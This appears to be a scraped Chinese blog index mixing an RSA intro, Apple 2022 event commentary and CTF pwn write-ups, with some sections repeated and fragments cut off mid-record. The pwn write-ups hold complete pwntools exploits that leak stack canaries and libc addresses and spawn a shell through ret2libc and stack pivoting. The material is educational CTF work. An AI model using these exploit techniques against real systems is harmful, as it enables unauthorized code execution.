假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#正确性证明"},{"categories":["CTF","CTF-Crypto"],"content":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入历史上常规的密码加解密算法的流程如下： 假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。 由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。 因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。 算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1","date":"2022-03-31","objectID":"/articles/basic_RSA/:0:0","series":null,"tags":null,"title":"RSA算法详解","uri":"/articles/basic_RSA/#拓展知识"},{"categories":["科技杂谈"],"content":" Apple 活动 - 2022 年 3 月 - Apple (中国大陆) 2022年3月9日凌晨2点，我以当天的工图考试考爆为代价（虽然不看也会考爆），看了这场发布会。 本场发布会苹果发布了新iPhone SE，iPad Air5，Mac Studio和Studio Display四款新品，iPhone13系列新增了配色。时长为1个小时的发布会内容不可谓不多，但万众期待的新MacBook Air和M2芯片没有发布。 ","date":"2022-03-10","objectID":"/articles/Appleevent2022/:0:0","series":null,"tags":null,"title":"写在Apple2022年春季发布会之后","uri":"/articles/Appleevent2022/#"},{"categories":["科技杂谈"],"content":" 近两年Apple发布会给人的奇怪感觉近两年关于Apple不再创新的论断已经几乎没有了，毫无疑问，Apple在个人电子设备领域不断地做出了一次又一次重大突破。遥记2020年Apple秋季发布会上登场的M1芯片，全新的架构为新设备带来了相当于老设备好几倍的性能，同时凭借ARM架构天然的省电特性，让仅重1.29kg的MacBook Air达到了惊人的18小时续航（我自己这台丐中丐版本8+256G版本MacBook Air实测开PD虚拟机打galgame一个多小时仅掉电7%，这可是经过了2层转译啊！）。 去年10月份发布的M1 Pro和M1 Max芯片进一步加大了芯片组的规模，达到了相当于X86平台i7-11800H+RTX3060 laptop组合的性能，同时功耗大大降低，使得搭载这颗芯片的MacBook Pro实现了不插电与插电相同性能。 M1 Pro 与 M1 Max 隆重登场：Apple 迄今打造的最强芯片 - Apple (中国大陆) 同时由于高通摆烂和华为被制裁，Apple的老本行手机芯片与安卓阵营的差距进一步拉大，用苹果的原话说：“他们甚至还在追赶我们两年前发布的芯片！“ Apple在芯片上的巨大优势，使得近两年的发布会让人有种奇妙的感觉，”除了芯片没活儿了！“ 仔细想想，确实是这样。 iPhone SE用6年前的外观换最新的A15芯片，新品！ iPad Air5从A14升级到桌面级的M1芯片，性能翻倍！不能说提升不大吧？新品！ Studio Display拿A13芯片当摄像头和音响驱动单元。最新的安卓旗舰手机打原神帧率甚至不如一个显示器（doge）。苹果仿佛在说：”我们知道显示器塞A13很奢侈，但没办法，这是我们在生产的性能最低的芯片。“（doge）你高通一届一届换了多少soc了，有用吗？换汤不换药啊！再下去要输显示器了，脸都不要了 务实成了Apple发布会的主旋律。MacBook Pro14英寸和16英寸的版本外观梦回PowerPC时代，接口数大大增加。Apple的Pro系列产品终于开始真正”Pro“，完全以实用为导向，在保证实用的基础上，做到尽量高水平的工业设计。 这些因素的共同作用导致现在Apple发布会的观感从没有创新到东西很好，但完全可预测。 ","date":"2022-03-10","objectID":"/articles/Appleevent2022/:0:1","series":null,"tags":null,"title":"写在Apple2022年春季发布会之后","uri":"/articles/Appleevent2022/#近两年apple发布会给人的奇怪感觉"},{"categories":["科技杂谈"],"content":" 狠角色M1 UltraMac Studio 和 Studio Display 登场 |bilibili M1 Ultra | 颠覆游戏规则 |bilibili Mac Studio - Apple (中国大陆) 两个M1 Max粘在一起。 看起来很简单粗暴，但是有很多问题可以深究。 两颗SOC是如何进行通讯的呢？一颗CPU如何访问另一颗CPU的寄存器，缓存？怎么进行算力资源分配？怎么保证**”胶水工艺“**的功耗和发热？这都属于普通消费者难以感知到的创新，但毫无疑问需要超高技术力去实现。（所以Mac Pro的芯片直接四颗M1 Max粘一起就好了（bushi）） 这颗芯片的多核性能可以跟目前消费级市场霸主AMD线程撕裂者看齐，GPU性能看齐RTX3080桌面端，但这也带来了更多问题。 ","date":"2022-03-10","objectID":"/articles/Appleevent2022/:0:2","series":null,"tags":null,"title":"写在Apple2022年春季发布会之后","uri":"/articles/Appleevent2022/#狠角色m1-ultra"},{"categories":["科技杂谈"],"content":" 处于阵痛期的Apple Silicon这么强的芯片，我到底拿来干嘛？ 《三维大型场景渲染》（插件不支持ARM架构，怎么干活？没Cuda） 《深度学习》（Cuda已成事实上的标准，没Cuda） 《打游戏》（macOS上本来就没几个大作玩，现在换ARM架构，能玩的游戏就更少了） 《编程》（解释型语言基本上适配了，但是编译型语言比如说C语言就很难用，gdb也不能用，学X86平台的汇编基本别想。。。） 《Matlab》（MATLAB使用的是Intel MKL(Math Kernel Library)数学核心计算库，在英特尔芯片上能获得最佳性能） 《虚拟化技术》（目前macOS平台最强虚拟化软件parallel desktop只支持安装针对ARM架构的操作系统，你苹果有能力号召厂商适配ARM架构，Windows/Linux平台可没办法快速适配ARM） 《工业软件》（macOS奇缺） 剪视频？它确实很能剪视频，对于专门剪视频的工作室来说，这机子顶配才不到70000就有了之前30万的Mac Pro2倍的性能和更小的体积，甚至很有性价比。 但作为消费级最强芯片（可能），能干的事如此有限，是不是有点可惜？ 从专精于某一特定领域到相对通用化的过程一定是艰难的。未来相当长的一段时间里，Apple Silicon将继续在它自己划定的范围里秒天秒地，但对当今购买计算机产品的主力人群即游戏玩家和工业软件使用者来说，它将直接不在考虑的范围之内。 macOS”咖喱味“越来越重了，bug明显比之前用x86平台的时候多了不少( ","date":"2022-03-10","objectID":"/articles/Appleevent2022/:0:3","series":null,"tags":null,"title":"写在Apple2022年春季发布会之后","uri":"/articles/Appleevent2022/#处于阵痛期的apple-silicon"},{"categories":["科技杂谈"],"content":" 未来过去苹果产品的性能不行导致众多生产力软件开发商和游戏开发者不愿意为苹果设备适配，但是如今Apple设备的性能全面跃进，也许以苹果的号召力，苹果会像如今在不到一年半的时间内让大部分常用软件适配Apple Silicon那样，在接下来的几年在多个领域全面开花也未可知。 （所以现在最香的是轻薄本，常用软件都适配了且续航超长~ 现在英特尔/AMD与Apple涉及的领域不同，在非轻薄本领域几乎不构成直接竞争关系，随着Apple的生态越来越丰富，未来势必有场恶战。 美企之间互相卷，可怜我国产芯片与人家差距进一步拉大。 ","date":"2022-03-10","objectID":"/articles/Appleevent2022/:0:4","series":null,"tags":null,"title":"写在Apple2022年春季发布会之后","uri":"/articles/Appleevent2022/#未来"},{"categories":["CTF","PWN"],"content":" canary绕过 什么是canary？canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。 是否开启canary的编译选项： gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。 如何绕过canary？canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。 ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:1","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#canary绕过"},{"categories":["CTF","PWN"],"content":" canary绕过 什么是canary？canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。 是否开启canary的编译选项： gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。 如何绕过canary？canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。 ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:1","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#什么是canary"},{"categories":["CTF","PWN"],"content":" canary绕过 什么是canary？canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。 是否开启canary的编译选项： gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。 如何绕过canary？canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。 ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:1","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#如何绕过canary"},{"categories":["CTF","PWN"],"content":" ret2libc 概述在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。 如果这两者都不显性存在，就可以使用ret2libc方法。 这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。 libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\"/bin/sh\") 来打开 shell。 工作重心转向获取libc.so加载进内存的可利用的函数的地址。 什么是动态链接？深入理解动态链接 - 简书 (jianshu.com) 深入理解GOT表和PLT表 - 知乎 (zhihu.com) got表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com) 简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。 而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。 例题：moeCTF2021 - baby canarychecksec后发现开了NX和canary保护。 canary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。 payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。 payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。 完整exp： from pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") local=1 e=ELF(\"./baby_canary\") puts_got=e.got[\"puts\"] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\"puts\"] libc = ELF('/lib/i386-linux-gnu/libc.so.6') def main(): if local: p=process(\"./baby_canary\") else: p=remote(\"114.67.175.224\",11482) p.recv() payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) p.recv() print(\"canary: \",hex(canary)) payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search(b'/bin/sh').__next__() p.recvuntil(\"u are?\\n\") p.send(payload1) payload3=b'a'*(0x4c-0xc)+p32(canary)+b'a'*12+p32(system_addr)+b'aaaa'+p32(binsh_addr) p.send(payload3) p.interactive() main() ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:2","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#ret2libc"},{"categories":["CTF","PWN"],"content":" ret2libc 概述在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。 如果这两者都不显性存在，就可以使用ret2libc方法。 这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。 libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\"/bin/sh\") 来打开 shell。 工作重心转向获取libc.so加载进内存的可利用的函数的地址。 什么是动态链接？深入理解动态链接 - 简书 (jianshu.com) 深入理解GOT表和PLT表 - 知乎 (zhihu.com) got表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com) 简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。 而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。 例题：moeCTF2021 - baby canarychecksec后发现开了NX和canary保护。 canary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。 payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。 payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。 完整exp： from pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") local=1 e=ELF(\"./baby_canary\") puts_got=e.got[\"puts\"] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\"puts\"] libc = ELF('/lib/i386-linux-gnu/libc.so.6') def main(): if local: p=process(\"./baby_canary\") else: p=remote(\"114.67.175.224\",11482) p.recv() payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) p.recv() print(\"canary: \",hex(canary)) payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search(b'/bin/sh').__next__() p.recvuntil(\"u are?\\n\") p.send(payload1) payload3=b'a'*(0x4c-0xc)+p32(canary)+b'a'*12+p32(system_addr)+b'aaaa'+p32(binsh_addr) p.send(payload3) p.interactive() main() ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:2","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#概述"},{"categories":["CTF","PWN"],"content":" ret2libc 概述在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。 如果这两者都不显性存在，就可以使用ret2libc方法。 这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。 libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\"/bin/sh\") 来打开 shell。 工作重心转向获取libc.so加载进内存的可利用的函数的地址。 什么是动态链接？深入理解动态链接 - 简书 (jianshu.com) 深入理解GOT表和PLT表 - 知乎 (zhihu.com) got表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com) 简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。 而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。 例题：moeCTF2021 - baby canarychecksec后发现开了NX和canary保护。 canary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。 payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。 payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。 完整exp： from pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") local=1 e=ELF(\"./baby_canary\") puts_got=e.got[\"puts\"] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\"puts\"] libc = ELF('/lib/i386-linux-gnu/libc.so.6') def main(): if local: p=process(\"./baby_canary\") else: p=remote(\"114.67.175.224\",11482) p.recv() payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) p.recv() print(\"canary: \",hex(canary)) payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search(b'/bin/sh').__next__() p.recvuntil(\"u are?\\n\") p.send(payload1) payload3=b'a'*(0x4c-0xc)+p32(canary)+b'a'*12+p32(system_addr)+b'aaaa'+p32(binsh_addr) p.send(payload3) p.interactive() main() ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:2","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#什么是动态链接"},{"categories":["CTF","PWN"],"content":" ret2libc 概述在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。 如果这两者都不显性存在，就可以使用ret2libc方法。 这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。 libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\"/bin/sh\") 来打开 shell。 工作重心转向获取libc.so加载进内存的可利用的函数的地址。 什么是动态链接？深入理解动态链接 - 简书 (jianshu.com) 深入理解GOT表和PLT表 - 知乎 (zhihu.com) got表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com) 简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。 而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。 例题：moeCTF2021 - baby canarychecksec后发现开了NX和canary保护。 canary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。 payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。 payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。 完整exp： from pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") local=1 e=ELF(\"./baby_canary\") puts_got=e.got[\"puts\"] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\"puts\"] libc = ELF('/lib/i386-linux-gnu/libc.so.6') def main(): if local: p=process(\"./baby_canary\") else: p=remote(\"114.67.175.224\",11482) p.recv() payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) p.recv() print(\"canary: \",hex(canary)) payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search(b'/bin/sh').__next__() p.recvuntil(\"u are?\\n\") p.send(payload1) payload3=b'a'*(0x4c-0xc)+p32(canary)+b'a'*12+p32(system_addr)+b'aaaa'+p32(binsh_addr) p.send(payload3) p.interactive() main() ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:2","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#例题moectf2021---baby-canary"},{"categories":["CTF","PWN"],"content":" 小插曲实践中发现，在函数调用栈中除了该有的局部变量，有时会出现一些奇怪的变量，这是由编译器决定的，一般用于存储寄存器上下文。 ","date":"2022-03-07","objectID":"/articles/CTFpwn2/:0:3","series":null,"tags":null,"title":"[PWN.0x01]canary|partial overwrite|ret2libc","uri":"/articles/CTFpwn2/#小插曲"},{"categories":["CTF","PWN"],"content":"前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret 函数调用栈的基本结构一些寄存器的作用： EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。 EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。 ESP：始终指向栈顶。 在进入一个函数时，会执行如下操作。 push eip+4 push ebp mov ebp,esp 在执行完退出时，会执行如下操作。 mov esp,ebp pop ebp pop eip 即leave和ret。 整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。 函数调用栈工作时的结构如下图： 其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如： void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。 考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。 但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。 栈迁移栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。 也就是说，要构造栈中数据如图所示： 至于为什么要-4，后面模拟的过程中读者自能体会。 好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图： 然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图： 这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。 例题：ciscn_2019_s_4BUUCTF在线评测 (buuoj.cn) 所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。 惯例checksec，只开了NX。 ida分析得到： int vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\"Hello, %s\\n\", buf); read(0, buf, 0x30u); return printf(\"Hello, %s\\n\", buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。 第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。 在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。 结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。 注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。 EXP： from psutil import process_iter from pwn import * context(arch=\"i386\",log_level=\"debug\") op=0 e=ELF(\"ciscn-s-4.bin\") sys_addr=e.symbols['system'] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\"ciscn-s-4.bin\") else: zeroy=remote(\"node4.buuoj.cn\",27827) payload1=b'a'*0x24+b\"bbbb\" zeroy.recvuntil(\"name?\") zeroy.send(payload1) zeroy.recvuntil(\"bbbb\") ebp_addr=u32(zeroy.recv(4)) print(\"ebp_addr: \",hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\\x00' payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() 